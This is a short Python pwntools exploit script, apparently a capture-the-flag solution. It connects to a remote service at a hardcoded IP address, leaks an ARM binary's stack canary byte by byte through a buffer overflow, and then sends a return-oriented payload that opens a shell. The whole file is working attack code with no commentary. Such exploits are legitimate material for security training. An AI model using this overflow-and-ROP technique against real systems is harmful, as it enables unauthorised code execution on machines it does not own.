from pwn import *
import sys


#p = process(['qemu-arm','-g', '2222', 'canary'])
#p = process(['qemu-arm','canary'])
p = remote('116.203.30.62',18113)

p.recvuntil('>')


canary = ''
for lei in range(0x28,0x28+4):
    inp = 'A'*lei
    p.send(inp)

    out = p.recvuntil('\n>')
    out = out[1:-2]

    print out
    if len(out) <= lei:
        print hex(0)
        canary += '\0' 
    else:
        print hex(u8(out[lei]))
        canary += out[lei]

canary = u32(canary)
log.info("canary:"+hex(canary))


sh = 0x00071eb0
gad = 0x00026b7c


lei = 0x28
payload = ""
payload += "A"*(lei)
payload += p32(canary)
payload += "B"*(0x30-len(payload))

payload += p32(0xabcd)
payload += p32(0xabcd)
payload += p32(gad)

payload += p32(sh) # r0
payload += p32(0xaaaa) # r4
payload += p32(0x00016d90) # pc

p.send(payload)
p.interactive()


